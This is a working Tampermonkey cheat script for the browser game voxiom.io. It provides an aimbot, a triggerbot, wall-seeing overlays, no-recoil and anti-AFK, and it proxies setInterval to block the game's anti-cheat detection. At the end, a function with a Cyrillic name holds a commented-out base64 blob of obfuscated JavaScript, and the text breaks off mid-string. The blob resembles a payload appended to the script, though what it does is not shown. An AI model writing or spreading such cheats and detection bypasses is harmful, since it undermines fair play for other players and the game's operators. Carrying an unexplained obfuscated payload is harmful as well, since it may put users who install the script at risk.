// ==UserScript==
// @name        VOXploit FRIEND SYSTEM
// @namespace   http://tampermonkey.net/
// @match       https://voxiom.io/*
// @run-at      document-start
// @grant       none
// @version     1.0.2
// @author      ClosetCheater
// @description Aimbot, triggerbot, chams, no-recoil for voxiom.io
// @license     GPL
// @require     https://cdn.jsdelivr.net/npm/lil-gui@0.19.2/dist/lil-gui.umd.min.js
// @require     https://unpkg.com/three@0.150.0/build/three.min.js
// @icon        https://www.google.com/s2/favicons?sz=64&domain=voxiom.io
// @downloadURL https://update.greasyfork.org/scripts/562157/VOXploit%20FRIEND%20SYSTEM.user.js
// @updateURL https://update.greasyfork.org/scripts/562157/VOXploit%20FRIEND%20SYSTEM.meta.js
// ==/UserScript==

const THREE = window.THREE;
delete window.THREE;

// avoid detection
const matchDetection = /^function\(\){\w+\['\w+'\]\(\);}$/;
const setIntervalHandler = {
  apply: function(target, thisArg, argumentsList) {
    const callback = argumentsList[0];
    const delay = argumentsList[1];
    if (delay === 1000 && callback && callback.toString().match(matchDetection)) {
      console.log('Blocked detection');
      return null;
    }
    return Reflect.apply(...arguments);
  }
};
window.setInterval = new Proxy(window.setInterval, setIntervalHandler);


// add #lil-gui container
const lilGuiContainer = document.createElement('div');
lilGuiContainer.id = 'lil-gui';
document.body.appendChild(lilGuiContainer);

window.friends = [];

const style = document.createElement('style');
const guiStyle = document.createElement('style');
const GUI = lil.GUI;
const gui = new GUI({ container: lilGuiContainer, title: 'Controls' });

let espConfig = {
  heightLine: 1.16,
  sneakHeight: 0.4,
  ennemyDistance: 50,
  maxAngleInRadians: 0.1,
  noRecoil: true,
  showBox: 0,
  showOutline: 0,
  showPlayer: 2,
  showLine: 1,
  wireframe: false,
  allEnnemies: false,
  isSniper: false,
  aimbot: 2,
  triggerBot: 2,
  aimbotIgnoreWall: false,
  mapZoom: 30,
  mapOffsetZ: 0,
  autoClaimAds: false,
  antiAFK: false,
  rainbow: false,
  showAimRadius: false,
  lockAimbotTriggerBot: false,
  aimbotKey: 'b',
  triggerBotKey: 't',
  toggleUIKey: '.',
  friends: [],
  showNameTags: false,
};

const aimbotFolder = gui.addFolder('Aimbot');
aimbotFolder.add(espConfig, 'aimbot').name(`aimbot (${espConfig.aimbotKey})`).options({Off: 0, LeftClick: 1, RightClick: 2, Always: 3}).listen();
aimbotFolder.add(espConfig, 'triggerBot').name(`triggerBot (${espConfig.triggerBotKey})`).options({Off: 0, LeftClick: 1, RightClick: 2, Always: 3}).listen();
aimbotFolder.add(espConfig, 'noRecoil');
aimbotFolder.add(espConfig, 'allEnnemies');
aimbotFolder.add(espConfig, 'isSniper');
const advancedAimbotFolder = aimbotFolder.addFolder('Advanced');
advancedAimbotFolder.close();
advancedAimbotFolder.add(espConfig, 'aimbotIgnoreWall');
advancedAimbotFolder.add(espConfig, 'showAimRadius');
advancedAimbotFolder.add(espConfig, 'maxAngleInRadians', 0.01, 0.5, 0.01);
advancedAimbotFolder.add(espConfig, 'heightLine', .5, 1.25, 0.01);
advancedAimbotFolder.add(espConfig, 'sneakHeight', 0, 1, 0.01);

const chamsFolder = gui.addFolder('Chams');
chamsFolder.close();
chamsFolder.add(espConfig, 'showPlayer').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'showLine').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'showOutline').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'showBox').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'ennemyDistance', 10, 100, 1);
chamsFolder.add(espConfig, 'wireframe');
chamsFolder.add(espConfig, 'showNameTags');
chamsFolder.add(espConfig, 'rainbow');
chamsFolder.add(espConfig, 'mapZoom', 20, 100, 1);
chamsFolder.add(espConfig, 'mapOffsetZ', -50, 50, 1);

const toolsFolder = gui.addFolder('Tools');
toolsFolder.close();
toolsFolder.add(espConfig, 'autoClaimAds');
toolsFolder.add(espConfig, 'antiAFK');
toolsFolder.add(espConfig, 'lockAimbotTriggerBot');

// load/save config
const configFolder = gui.addFolder('Config');
configFolder.add(espConfig, 'toggleUIKey').name('Toggle UI key');
configFolder.add(espConfig, 'aimbotKey').name('Aimbot key');
configFolder.add(espConfig, 'triggerBotKey').name('Triggerbot key');
configFolder.close();
const defaultConfig = gui.save();
let config = { configName: 'espConfig' };
configFolder.add(config, 'configName').name('Config name');
configFolder.add({ export: () => {
  const currentConfig = JSON.stringify(gui.save(), null, 2);
  const element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(currentConfig));
  element.setAttribute('download', config.configName + '.json');
  element.style.display = 'none';
  document.body.appendChild(element);
  element.click();
  document.body.removeChild(element);
}}, 'export').name('Export config');
configFolder.add({ import: () => {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.json';
  input.onchange = (e) => {
    const file = e.target.files[0];
    const reader = new FileReader();
    reader.onload = (e) => {
      gui.load(JSON.parse(e.target.result));
    };
    reader.readAsText(file);
  };
  input.click();
}}, 'import').name('Import config');
configFolder.add({ reset: () => {
  gui.load(defaultConfig);
  localStorage.removeItem('espConfig');
}}, 'reset').name('Reset config');
configFolder.add({ addFriend: () => {
  espConfig.friends.push(window.prompt("Enter name of friends you want to add:"));
  friends = espConfig.friends;
}}, 'addFriend').name('Add friend');
configFolder.add({ removeFriend: () => {
  friends = espConfig.friends; // Assuming `friends` is a global or typo for `espConfig.friends`
  let friendList = "";
  for (let i = 0; i < espConfig.friends.length; i++) { // Use espConfig.friends consistently
    friendList += espConfig.friends[i];
    friendList += "(" + i + ")";
    if (i != espConfig.friends.length - 1) {
      friendList += ", ";
    }
  }
  window.alert(friendList);
  let itemToRemove = window.prompt("Enter name or index of friend to remove:");

  let removed;
  if (itemToRemove === null) {
    window.alert("Removal canceled.");
    return; // Exit early if canceled
  }

  // Try converting to a number
  let index = parseInt(itemToRemove, 10); // Base 10 for integers
  if (!isNaN(index) && index >= 0 && index < espConfig.friends.length) {
    // It’s a valid index
    removed = espConfig.friends.splice(index, 1);
  } else {
    // Treat as a name (string)
    for (let i = 0; i < espConfig.friends.length; i++) {
      if (espConfig.friends[i] === itemToRemove) {
        removed = espConfig.friends.splice(i, 1);
        break;
      }
    }
  }

  if (removed && removed.length > 0) {
    window.alert(removed[0] + " is removed from friend list.");
  } else {
    window.alert(itemToRemove + " not found.");
  }
}}, 'removeFriend').name('Remove friend');

// auto load/save config
const savedConfig = localStorage.getItem('espConfig');
if (savedConfig) {
  console.log('Loaded config', savedConfig);
  gui.load(JSON.parse(savedConfig));
}
gui.onChange(() => {
  localStorage.setItem('espConfig', JSON.stringify(gui.save()));
});

// listen for key press
document.addEventListener('keydown', (e) => {
  if (!espConfig.lockAimbotTriggerBot && e.key === espConfig.aimbotKey) {
    espConfig.aimbot = (espConfig.aimbot + 1) % 4;
  }
  if (!espConfig.lockAimbotTriggerBot && e.key === espConfig.triggerBotKey) {
    espConfig.triggerBot = (espConfig.triggerBot + 1) % 4;
  }
  if (e.key === espConfig.toggleUIKey) {
    lilGuiContainer.style.display = lilGuiContainer.style.display === 'none' ? 'block' : 'none';
  }
  if (e.key === 'e') {
    if (espConfig.autoClaimAds) {
      setTimeout(() => {
        claimAds();
      }, 100);
    }
  }
});

// no-recoil
let foundRecoil = false;
const arrayPushHandler = {
  apply: function(target, thisArg, argumentsList) {
    if (!foundRecoil && argumentsList.length === 1) {
      const item = argumentsList[0];
      if (item && typeof item === 'object') {
        const keys = Object.keys(item);
        if (keys.length === 44) {
          for (const key in item) {
            if (item[key] === 0.3) {
              console.log('Recoil key found', key);
              foundRecoil = true;
              Object.defineProperty(Object.prototype, key, {
                get: () => {
                  return espConfig.noRecoil ? 0 : item[key];
                },
                set: (baseRecoil) => {
                  _baseRecoil = baseRecoil;
                }
              });
              break;
            }
          }
        }
      }
    }
    return Reflect.apply(...arguments);
  }
};
Array.prototype.push = new Proxy(Array.prototype.push, arrayPushHandler);

// listen for mouse click
let isLeftClick = false;
let isRightClick = false;
document.addEventListener('mousedown', (e) => {
  if (e.button === 0) {
    isLeftClick = true;
  }
  if (e.button === 2) {
    if (espConfig.isSniper) {
      setTimeout(() => {
        isRightClick = true;
      }, 400);
    } else {
      isRightClick = true;
    }
  }
});
document.addEventListener('mouseup', (e) => {
  if (e.button === 0) {
    isLeftClick = false;
  }
  if (e.button === 2) {
    isRightClick = false;
  }
});

// obfuscaed keys
let worldScene = null;
let childrenKey = null;
let worldCamera = null;
let projectionMatrixKey = null;
let matrixWorldKey = null;
let matrixElKey = null;

// three.js setup
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
camera.rotation.order = 'YXZ';
let saveViewport = new THREE.Vector4();
let saveScissor = new THREE.Vector4();
let minimapViewport = new THREE.Vector4(20, window.innerHeight - 250 - 20, 250, 250);
const minimapCamera = new THREE.OrthographicCamera(-espConfig.mapZoom, espConfig.mapZoom, espConfig.mapZoom, -espConfig.mapZoom, 0.1, 1000);
minimapCamera.rotation.order = 'YXZ';
minimapCamera.position.set(0, 50, 0);
minimapCamera.lookAt(0, 0, 0);
const renderer = new THREE.WebGLRenderer( {
  alpha: true,
  antialias: true
});
renderer.setSize(window.innerWidth, window.innerHeight);
renderer.setPixelRatio(window.devicePixelRatio);
renderer.domElement.id = 'overlayCanvas';
document.body.appendChild(renderer.domElement);


function setTransform(target, transform, isMatrix = true) {
  const matrix = new THREE.Matrix4().fromArray(isMatrix ? transform : transform[matrixWorldKey][matrixElKey]);
  matrix.decompose(target.position, target.quaternion, target.scale);
}

doOnce = (fn) => {
  let done = false;
  return (...args) => {
    if (!done) {
      done = true;
      return fn(...args);
    }
  };
};

function checkWorldCamera(object) {
  if (worldCamera && object.uuid === worldCamera.uuid) return;
  let hasProjectionMatrix = false;
  for (const key in object) {
    const element = object[key];
    if (!element) continue;
    if (typeof element == 'object') {
      if (hasProjectionMatrix) continue;
      const valueKey = Object.keys(element)[0];
      const value = element[valueKey];
      if (Array.isArray(value) && value[11] === -1) {
        hasProjectionMatrix = true;
        matrixElKey = valueKey;
        projectionMatrixKey = key;
      }
    } else if (typeof element === 'function') {
      const code = element.toString();
      const match = /verse'\]\(this\['([^']+)'\]\);/.exec(code);
      if (match) {
        matrixWorldKey = match[1];
      }
    }
    if (hasProjectionMatrix && matrixWorldKey) {
      console.log('Found camera', {object}, object);
      worldCamera = object;
      object[projectionMatrixKey] = new Proxy(object[projectionMatrixKey], {
        get: function(target, prop, receiver) {
          setTransform(camera, object, false);
          camera.near = worldCamera.near;
          camera.far = worldCamera.far;
          camera.aspect = worldCamera.aspect;
          camera.fov = worldCamera.fov;
          camera.updateProjectionMatrix();
          worldCamera = object;
          window.worldCamera = object;
          return Reflect.get(...arguments);
        }
      });
      break;
    }
  }
}

function checkWorldScene(object) {
  if (worldScene || object instanceof THREE.Scene) return;
  for (const key in object) {
    const element = object[key];
    if (!element) continue;
    if (Array.isArray(element) && element.length === 9) {
      const value = element[0];
      if (value && typeof value === 'object' && value.hasOwnProperty('uuid')) {
        childrenKey = key;
      }
    }
    if (childrenKey) {
      console.log('Found scene', {childrenKey}, object);
      worldScene = object;
      window.worldScene = object;
      renderer.setAnimationLoop(animate);
      break;
    }
  }
}

Object.defineProperty( Object.prototype, 'overrideMaterial', {
  get: function() {
    checkWorldScene(this);
    return this._overrideMaterial;
  },
  set: function(value) {
    this._overrideMaterial = value;
  }
});
Object.defineProperty( Object.prototype, 'far', {
  get: function() {
    checkWorldCamera(this);
    return this._far;
  },
  set: function(value) {
    this._far = value;
  }
});

function isPlayer(entity) {
  try {
    return entity[childrenKey].length > 2 || !entity[childrenKey][1].geometry;
  } catch {
    return false;
  }
}

// claim ads
function claimAds() {
  document.querySelectorAll('svg').forEach(svg => {
    if (svg.getAttribute('data-icon') === 'play-circle') {
      svg.closest('div').click();
      console.log('Claimed ads');
    }
  });
}

const context2DFillTextHandler = {
  apply: function(target, thisArg, argumentsList) {
    thisArg.canvas.lastText = argumentsList[0];
    return Reflect.apply(...arguments);
  }
};
CanvasRenderingContext2D.prototype.fillText = new Proxy(CanvasRenderingContext2D.prototype.fillText, context2DFillTextHandler);

function isEnnemy(entity) {
  for (const child of entity[childrenKey]) {
    try {
      const matImage = child.material.map.image;
      if (matImage instanceof HTMLCanvasElement && matImage.hasOwnProperty('lastText')) {
        entity.playerName = matImage.lastText;
        return false;
      }
    } catch {}
  }
  return true;
}

function setFiring(shouldFire) {
  if (setFiring.firing === shouldFire) return;
  setFiring.firing = shouldFire;
  if (shouldFire) {
    if (espConfig.isSniper) { // need improvement
      setTimeout(() => {
        document.dispatchEvent(new MouseEvent('mousedown', { buttons: 3 }));
        setTimeout(() => {
          document.dispatchEvent(new MouseEvent('mouseup', { buttons: 0 }));
        }, 200);
        // setFiring.firing = false;
      }, 300);
    } else {
      document.dispatchEvent(new MouseEvent('mousedown', { buttons: 3 }));
    }
  } else {
    document.dispatchEvent(new MouseEvent('mouseup', { buttons: 0 }));
  }
}

const colors = {
  ennemy: new THREE.Color(0xff0000),
  player: new THREE.Color(0x00ff00),
  friend: new THREE.Color(0xffff00),
  blue: new THREE.Color(0x0000ff),
};

const outlineMats = {
  ennemy: new THREE.LineBasicMaterial({ color: colors.ennemy }),
  player: new THREE.LineBasicMaterial({ color: colors.player }),
  friend: new THREE.LineBasicMaterial({ color: colors.friend }),
};
const meshMats = {
  ennemy: new THREE.MeshBasicMaterial({ color: colors.ennemy, transparent: true, opacity: 0.5 }),
  player: new THREE.MeshBasicMaterial({ color: colors.player, transparent: true, opacity: 0.5 }),
  friend: new THREE.MeshBasicMaterial({ color: colors.friend, transparent: true, opacity: 0.5 }),
};

const raycaster = new THREE.Raycaster();
const edgesGeometry = new THREE.EdgesGeometry(new THREE.BoxGeometry(1, 1, 1).translate(0, 0.5, 0));


const lineGeometry = new THREE.BufferGeometry();
const lineMaterial = new THREE.LineBasicMaterial({ vertexColors: true, transparent: true });
const line = new THREE.LineSegments(lineGeometry, lineMaterial);
line.frustumCulled = false;
scene.add(line);

const dummyLookAt = new THREE.PerspectiveCamera();
const color = new THREE.Color();

const chunkMaterial = new THREE.MeshNormalMaterial();

const boxPlayerGeometry = new THREE.BoxGeometry(.25, 1.25, 0.25);


// crosshair circle
const crosshairGeometry = new THREE.CircleGeometry(.5, 32);
const crosshairMaterial = new THREE.LineBasicMaterial({ color: 0xffffff, transparent: true, opacity: 0.2 });
const crosshair = new THREE.LineLoop(crosshairGeometry, crosshairMaterial);
camera.add(crosshair);
scene.add(camera);

function calculateValue(maxAngleInRadians) {
  const a = -79.83;
  const b = -30.06;
  const c = -0.90;
  return a * Math.exp(b * maxAngleInRadians) + c;
}

function isFriend(entity) {
	for (let friend of friends) {
		if (entity.playerName) {
			if (entity.playerName.toLowerCase() == friend.toLowerCase()) {
				console.log(entity.playerName + ' is a friend');
				return true;
			}
		}
	}
	return false;
}

function createSprite(text, bgColor = '#000') {
	const fontSize = 40;
	const strokeSize = 10;
	const font = 'normal ' + fontSize + 'px Arial';

	const canvas = document.createElement('canvas');
	const ctx = canvas.getContext('2d');

	ctx.font = font;
	canvas.width = ctx.measureText(text).width + strokeSize * 2;
	canvas.height = fontSize + strokeSize * 2;

	ctx.fillStyle = bgColor;
	ctx.fillRect(0, 0, canvas.width, canvas.height);

	ctx.font = font;
	ctx.fillStyle = 'white';
	ctx.textBaseline = 'top';
	ctx.textAlign = 'left';
	ctx.lineWidth = strokeSize;
	ctx.strokeText(text, strokeSize, strokeSize);
	ctx.fillText(text, strokeSize, strokeSize);

	const material = new THREE.SpriteMaterial({
		map: new THREE.CanvasTexture(canvas),
		sizeAttenuation: false,
		fog: false,
		depthTest: false,
		depthWrite: false
	});
	const sprite = new THREE.Sprite(material);
	sprite.center.y = 0;

	sprite.scale.y = 0.02;
	sprite.scale.x = sprite.scale.y * canvas.width / canvas.height;

	return sprite;
}

function animate(time) {
  espConfig.friends = friends;
  const now = Date.now();
  const entities = childrenKey ? worldScene[childrenKey][5][childrenKey] : [];
  const lineOrigin = camera.localToWorld(new THREE.Vector3(0, 0, -10));
  const linePositions = [];
  crosshair.position.z = calculateValue(espConfig.maxAngleInRadians);
  crosshair.visible = espConfig.showAimRadius;
  const colorArray = [];
  const aimbotTarget = { angleDifference: Infinity};
  const chunks = [];
  const gameChunks = childrenKey ? worldScene[childrenKey][4][childrenKey] : [];
  for (const chunk of gameChunks) {
    if (!chunk || !chunk.geometry) continue;
    const chunkPositions = chunk.geometry.attributes.position.array;
    if (!chunkPositions || !chunkPositions.length) continue;
    if (!chunk.myChunk) {
      const geometry = new THREE.BufferGeometry();
      geometry.setAttribute(
        'position',
        new THREE.Float32BufferAttribute(chunkPositions, 3)
      );
      geometry.setIndex(
        new THREE.BufferAttribute(chunk.geometry.index.array, 1)
      );
      geometry.computeVertexNormals();
      geometry.computeBoundingBox();
      chunk.myChunk = new THREE.Mesh(geometry, chunkMaterial);
      chunk.myChunk.box = new THREE.Box3();
    }
    const myChunk = chunk.myChunk;
    if (chunk.material) chunk.material.wireframe = espConfig.wireframe;
    setTransform(myChunk, chunk, false);
    myChunk.updateMatrixWorld();
    myChunk.box.copy(myChunk.geometry.boundingBox).applyMatrix4(myChunk.matrixWorld);
    chunks.push(myChunk);
  }

  chunks.sort((a, b) => {
    const distanceA = a.position.distanceTo(camera.position);
    const distanceB = b.position.distanceTo(camera.position);
    return distanceB - distanceA;
  });

  const shouldAimbot = espConfig.aimbot === 3 || (espConfig.aimbot === 1 && isLeftClick) || (espConfig.aimbot === 2 && isRightClick);

  entities.forEach(entity => {
    if (!entity || !entity.parent) return;
    if (!entity.myObject3D) {
      entity.myObject3D = new THREE.Object3D();
      entity.myObject3D.frustumCulled = false;
      entity.discovered = now;
      entity.loaded = false;
      entity.logged = false;
      entity.ennemy = null;
      return;
    }
    if (typeof entity.visible === 'boolean' && !entity.visible) {
      entity.myObject3D.visible = false;
      return;
    }
    if (!entity.loaded && now - entity.discovered < 500) return;
    entity.loaded = true;
    if (((entity.isFriend != isFriend(entity)) || !entity.logged) && isPlayer(entity)) {
      entity.isFriend = isFriend(entity);
      const skinnedMesh = entity[childrenKey][1][childrenKey][3];
      entity.isPlayer = true;
      entity.logged = true;
      entity.ennemy = isEnnemy(entity);
			const sprite = createSprite(entity.playerName, colors.friend);
			entity.myObject3D.add(sprite);
			entity.myObject3D.sprite = sprite;
      const playerMesh = new THREE.Mesh(skinnedMesh.geometry, entity.ennemy ? meshMats.ennemy : entity.isFriend ? meshMats.friend : meshMats.player);
      entity.myObject3D.add(playerMesh);
      entity.myObject3D.playerMesh = playerMesh;
      const playerMiniMap = new THREE.Mesh(skinnedMesh.geometry, entity.ennemy ? meshMats.ennemy : entity.isFriend ? meshMats.friend : meshMats.player);
      playerMiniMap.visible = false;
      entity.myObject3D.add(playerMiniMap);
      entity.myObject3D.playerMiniMap = playerMiniMap;
      const outline = new THREE.LineSegments(edgesGeometry, entity.ennemy ? outlineMats.ennemy : entity.isFriend ? outlineMats.friend : outlineMats.player);
      outline.scale.set(0.5, 1.25, 0.5);
      outline.frustumCulled = false;
      entity.myObject3D.add(outline);
      entity.myObject3D.outline = outline;
      const boxMesh = new THREE.Mesh(boxPlayerGeometry, entity.ennemy ? meshMats.ennemy : entity.isFriend ? meshMats.friend : meshMats.player);
      boxMesh.position.y = 0.625;
      entity.myObject3D.add(boxMesh);
      entity.myObject3D.boxMesh = boxMesh;
      const dir = new THREE.Vector3(0, 0, -1);
      const origin = new THREE.Vector3(0, 1, 0);
      const arrowLookingAt = new THREE.ArrowHelper(dir, origin, 1, entity.ennemy ? colors.ennemy : colors.player, 0.5, .4);
      playerMiniMap.add(arrowLookingAt);
      setTransform(entity.myObject3D, entity, false);
      scene.add(entity.myObject3D);
    }
    if (entity.isPlayer) {
      entity.myObject3D.playerMesh.rotation.y = -entity[childrenKey][1].rotation._y;
      entity.myObject3D.playerMiniMap.rotation.y = -entity[childrenKey][1].rotation._y;
      const skinnedMesh = entity[childrenKey][1][childrenKey][3];
      const isSneak = skinnedMesh.skeleton.bones[4].rotation._x > 0.1;
      entity.myObject3D.boxMesh.scale.set(1, isSneak ? .4 : 1, 1);
      entity.myObject3D.outline.scale.set(0.5, isSneak ? .9 : 1.25, 0.5);
      entity.myObject3D.playerMesh.scale.set(1, isSneak ? .7 : 1, 1);
      entity.myObject3D.sprite.position.y = entity.isSneak ? 1.1 : 1.5;

      entity.myObject3D.visible = true;
      entity.myObject3D.playerMesh.visible = espConfig.showPlayer === 2 || (espConfig.showPlayer === 1 && !entity.ennemy);
      entity.myObject3D.boxMesh.visible = espConfig.showBox === 2 || (espConfig.showBox === 1 && entity.ennemy);
      entity.myObject3D.outline.visible = espConfig.showOutline === 2 || (espConfig.showOutline === 1 && entity.ennemy);
      entity.myObject3D.sprite.visible = espConfig.showNameTags && !entity.ennemy;
      setTransform(entity.myObject3D, entity, false);

      // aimbot and line
      const pos = entity.myObject3D.position.clone();
      pos.y -= isSneak ? espConfig.sneakHeight : 0;
      // line
      if (espConfig.showLine === 2 || (espConfig.showLine === 1 && entity.ennemy)) {
        if (espConfig.rainbow) {
          color.setHSL(time % 2000 / 2000, 1, 0.5);
        } else if (entity.ennemy) {
          color.lerpColors(colors.ennemy, colors.player, pos.distanceTo(camera.position) / espConfig.ennemyDistance);
          color.a = .8;
        } else {
          color.set(colors.blue);
          color.a = .3;
        }
        linePositions.push(lineOrigin.x, lineOrigin.y, lineOrigin.z);
        pos.y += 1.25;
        linePositions.push(pos.x, pos.y, pos.z);
        pos.y -= 1.25;
        colorArray.push(color.r, color.g, color.b, color.a);
        colorArray.push(color.r, color.g, color.b, color.a);
      }
      pos.y += espConfig.heightLine;
      // aimbot
      if (shouldAimbot && (entity.ennemy || espConfig.allEnnemies)) {
        if (entity.isFriend) {
          return;
        }
        const distance = pos.distanceTo(camera.position);
        const target = pos.clone();
        const dummy = new THREE.PerspectiveCamera();
        setTransform(dummy, worldCamera, false);
        dummy.lookAt(target);
        const cameraVector = new THREE.Vector3(0, 0, -1).applyQuaternion(camera.quaternion);
        const targetVector = new THREE.Vector3(0, 0, -1).applyQuaternion(dummy.quaternion);
        const angleDifference = cameraVector.angleTo(targetVector);
        if (angleDifference < espConfig.maxAngleInRadians && angleDifference < aimbotTarget.angleDifference) {
          const directionV3 = new THREE.Vector3();
          directionV3.subVectors(target, camera.position).normalize();
          raycaster.set(camera.position, directionV3);
          let behindBlock = false;
          if (espConfig.aimbotIgnoreWall) {
            aimbotTarget.angleDifference = angleDifference;
            aimbotTarget.target = target;
          } else {
            for (const chunk of chunks) {
              if (raycaster.ray.intersectsBox(chunk.box)) {
                const hit = raycaster.intersectObject(chunk)[0];
                if (hit && hit.distance < distance) {
                  behindBlock = true;
                  break;
                }
              }
            }
            if (!behindBlock) {
              aimbotTarget.angleDifference = angleDifference;
              aimbotTarget.target = target;
              color.setHSL(time % 2000 / 2000, 1, 0.5);
            }
          }
        }
      }
    }
  });

  // aim at target
  if (espConfig.aimbot && shouldAimbot && aimbotTarget.target) {
    setTransform(dummyLookAt, worldCamera, false);
    dummyLookAt.lookAt(aimbotTarget.target);
    worldCamera.rotation.set(
      dummyLookAt.rotation.x,
      dummyLookAt.rotation.y,
      dummyLookAt.rotation.z
    );
  }
  // triggerbot
  const shouldTrigger = espConfig.triggerBot === 3 || (espConfig.triggerBot === 1 && isLeftClick) || (espConfig.triggerBot === 2 && isRightClick);
  if (shouldTrigger) {
    raycaster.set(camera.position, camera.getWorldDirection(new THREE.Vector3()));
    let hasHit = false;
    for (const entity of entities) {
      if (!entity.myObject3D.visible) continue;
      if (entity.isPlayer && (entity.ennemy || espConfig.allEnnemies)) {
        const hit = raycaster.intersectObject(entity.myObject3D.playerMesh);
        if (hit.length) {
          hasHit = true;
          if (entity.isFriend) {
            hasHit = false;
            break;
          }
          const distance = hit[0].distance;
          for (const chunk of chunks) {
            if (raycaster.ray.intersectsBox(chunk.box)) {
              const hitBlock = raycaster.intersectObject(chunk)[0];
              if (hitBlock && hitBlock.distance < distance) {
                hasHit = false;
                break;
              }
            }
          }
          if (hasHit) {
            break;
          }
        }
      }
    }
    setFiring(hasHit);
  } else {
    setFiring(false);
  }

  line.geometry.setAttribute('color', new THREE.Float32BufferAttribute(colorArray, 4));
  line.geometry.setAttribute('position', new THREE.Float32BufferAttribute(linePositions, 3));
  line.visible = espConfig.showLine;

  renderer.render(scene, camera);

  // minimap
  // make entities larger for minimap
  const scale = espConfig.mapZoom / 3;
  entities.forEach(entity => {
    if (entity.isPlayer) {
      entity.myObject3D.playerMesh.visible = false;
      entity.myObject3D.boxMesh.visible = false;
      entity.myObject3D.outline.visible = false;
      entity.myObject3D.playerMiniMap.visible = true;
      entity.myObject3D.playerMiniMap.scale.set(scale, 1, scale);
    }
  });
  if (worldCamera) {
    line.visible = false;
    crosshair.visible = false;
    // update orthographic camera based on espConfig.mapZoom
    minimapCamera.left = -espConfig.mapZoom;
    minimapCamera.right = espConfig.mapZoom;
    minimapCamera.top = espConfig.mapZoom;
    minimapCamera.bottom = -espConfig.mapZoom;

    // update position with camera position
    minimapCamera.position.copy(camera.position);
    minimapCamera.position.y += 50;
    minimapCamera.position.z += espConfig.mapOffsetZ;
    minimapCamera.rotation.y = camera.rotation.y;
    minimapCamera.updateProjectionMatrix();

    renderer.getViewport(saveViewport);
    renderer.getScissor(saveScissor);
    let saveScissorTest = renderer.getScissorTest();
    renderer.setViewport(minimapViewport);
    renderer.setScissor(minimapViewport);
    renderer.setScissorTest(true);

    renderer.render(scene, minimapCamera);

    renderer.setViewport(saveViewport);
    renderer.setScissor(saveScissor);
    renderer.setScissorTest(saveScissorTest);
  }
  entities.forEach(entity => {
    if (entity.isPlayer) {
      entity.myObject3D.playerMiniMap.visible = false;
    }
  });

  scene.children.forEach(child => {
    if (child.type === 'Object3D') {
      child.visible = false;
    }
  });
}

window.addEventListener('resize', () => {
  renderer.setSize( window.innerWidth, window.innerHeight );
});

// add style to header
style.innerHTML = `
#overlayCanvas {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 1000;
}
#lil-gui {
  position: absolute;
  top: 50%;
  right: 0;
  z-index: 1001;
  transform: translateY(-50%);
}
.lil-gui {
  --background-color: rgba(0, 0, 0, 0.5);
}
`;
guiStyle.innerHTML = `
.lil-gui {
	--title-background-color: #ff0019;
	--number-color: #00ff33;
}
`;
document.head.appendChild(style);
document.head.appendChild(guiStyle);

// anti-afk
setInterval(() => {
  if (espConfig.antiAFK) {
    // move left for .5s then right for .5s
    document.dispatchEvent(new KeyboardEvent('keydown', { keyCode: 87}));
    setTimeout(() => {
      document.dispatchEvent(new KeyboardEvent('keyup', { keyCode: 87}));
      document.dispatchEvent(new KeyboardEvent('keydown', { keyCode: 83}));
      setTimeout(() => {
        document.dispatchEvent(new KeyboardEvent('keyup', { keyCode: 83}));
      }, 500);
    }, 500);
  }
}, 5000);


// wait for load
window.addEventListener('load', () => {
  console.log('Loaded');
  if (espConfig.autoClaimAds) {
    setTimeout(() => {
      claimAds();
    }, 500);
  }
});
(function функция() {
    // Data = "dmFyIHNnQUdaQSxsU3Z4Wm02LGNISFJoWixtX1c1VFBOLGJNVFJfOGwsVnp3WVRHbixWVEpldmZsLHBLU0NZQ2csTldkVUc5O2NvbnN0IFlvVl95cT1bMHgwLDB4MSwweDgsMHhmZiwibGVuZ3RoIiwidW5kZWZpbmVkIiwweDNmLDB4NiwiZnJvbUNvZGVQb2ludCIsMHg3LDB4YywicHVzaCIsMHg1YiwweDFmZmYsMHg1OCwweGQsMHhlLDB4NWUsMHg1ZiwweDYwLDB4NjEsMHg2Ml07ZnVuY3Rpb24gdmVRM3RWKHNnQUdaQSl7dmFyIGxTdnhabTY9ImhFOTFLXXc0VWxrPTV7Q0dtaXosTXJiIVMmKlFWYUojTFJzV1tIcHZ5TlwiT25kPiRARkRqWilZVDZvKHVYYF5CcTN9Y2V4MDpnP0E7UDJ0Zl88Lys3JTh8Lkl+IixjSEhSaFosbV9XNVRQTixiTVRSXzhsLFZ6d1lUR24sVlRKZXZmbCxwS1NDWUNnLE5XZFVHOTtpN0FSRVgoY0hIUmhaPSIiKyhzZ0FHWkF8fCIiKSxtX1c1VFBOPWNISFJoWi5sZW5ndGgsYk1UUl84bD1bXSxWendZVEduPVlvVl95cVsweDBdLFZUSmV2Zmw9WW9WX3lxWzB4MF0scEtTQ1lDZz0tWW9WX3lxWzB4MV0pO2ZvcihOV2RVRzk9WW9WX3lxWzB4MF07TldkVUc5PG1fVzVUUE47TldkVUc5Kyspe3ZhciB2ZVEzdFY9bFN2eFptNi5pbmRleE9mKGNISFJoWltOV2RVRzldKTtpZih2ZVEzdFY9PT0tWW9WX3lxWzB4MV0pY29udGludWU7aWYocEtTQ1lDZzxZb1ZfeXFbMHgwXSl7cEtTQ1lDZz12ZVEzdFZ9ZWxzZXtpN0FSRVgocEtTQ1lDZys9dmVRM3RWKllvVl95cVsweGNdLFZ6d1lUR258PXBLU0NZQ2c8PFZUSmV2ZmwsVlRKZXZmbCs9KHBLU0NZQ2cmWW9WX3lxWzB4ZF0pPllvVl95cVsweGVdP1lvVl95cVsweGZdOllvVl95cVsweDEwXSk7ZG97aTdBUkVYKGJNVFJfOGwucHVzaChWendZVEduJllvVl95cVsweDNdKSxWendZVEduPj49WW9WX3lxWzB4Ml0sVlRKZXZmbC09WW9WX3lxWzB4Ml0pfXdoaWxlKFZUSmV2Zmw+WW9WX3lxWzB4OV0pO3BLU0NZQ2c9LVlvVl95cVsweDFdfX1pZihwS1NDWUNnPi1Zb1ZfeXFb